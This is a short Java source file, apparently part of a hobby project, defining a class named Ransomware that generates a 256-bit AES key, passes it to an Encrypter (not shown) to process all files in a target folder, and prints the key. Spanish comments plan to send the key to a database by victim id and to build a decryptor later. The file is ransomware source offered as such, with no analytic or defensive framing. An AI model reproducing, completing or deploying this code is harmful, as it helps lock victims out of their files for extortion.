package Ransomware.Encrypter;

import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import java.io.File;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;

public class Ransomware {
    private final String key;
    private final File folder;
    private final Encrypter encrypter;

    public Ransomware(String path,String ext) throws NoSuchAlgorithmException {
        this.key = generateKey();
        this.encrypter = new Encrypter(key,ext);
        folder = new File(path);
    }
    public String generateKey() throws NoSuchAlgorithmException {
        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(256);
        SecretKey secretKey = keyGen.generateKey();
        return Base64.getEncoder().encodeToString(secretKey.getEncoded());
    }
    public void execute() {
        encrypter.processFiles(folder);
        System.out.println(key);
        //generateMessage(path);
        // Enviar key a base de datos con id.
        // Crear programa para desencryptar luego
    }

}